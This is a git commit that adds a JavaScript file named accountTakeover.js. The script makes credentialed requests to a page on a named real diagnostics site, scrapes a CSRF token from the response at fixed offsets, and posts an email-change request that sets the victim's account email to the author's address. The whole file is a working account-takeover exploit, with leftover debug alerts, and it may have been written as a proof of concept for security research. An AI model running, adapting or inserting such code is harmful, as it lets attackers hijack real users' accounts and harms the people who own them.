1f8b518fff46bbf06054ae9e0079f3fb03fc0bdb
commonudon <maykoh@live.com>
2017-08-16 16:16:09 +0800

    Create accountTakeover.js

---
+++ accountTakeover.js
@@ -0,0 +1,31 @@
+var fetchHash = new XMLHttpRequest();
+
+var url = "https://usdiagnostics.roche.com/my-lab-update-email.html";
+var datax;
+var csrf_token='initial';
+fetchHash.onreadystatechange=function ()
+{
+if(fetchHash.readyState==4 && fetchHash.status==200)
+        {
+
+            datax = fetchHash.responseText;
+                       alert(datax);
+                    csrf_token = datax.substring(285,321);
+                         alert(csrf_token);
+
+                         var HackAccount = new XMLHttpRequest();
+                         url= "https://usdiagnostics.roche.com/my-lab-update-email.html";
+                         HackAccount .open("POST",url, true);
+                         HackAccount .withCredentials=true;
+                         var data= 'csrfToken='+csrf_token+'&proceedWithNonwhitelist=true&newEmail=maykoh@live.com&newEmail2=maykoh@live.com' ;
+                         HackAccount .setRequestHeader('X-Requested-With','XMLHttpRequest');
+                         HackAccount .setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+                         HackAccount .send(data);
+
+                         }
+
+}
+
+fetchHash.open("GET",url, true);
+fetchHash.withCredentials=true;
+fetchHash.send();
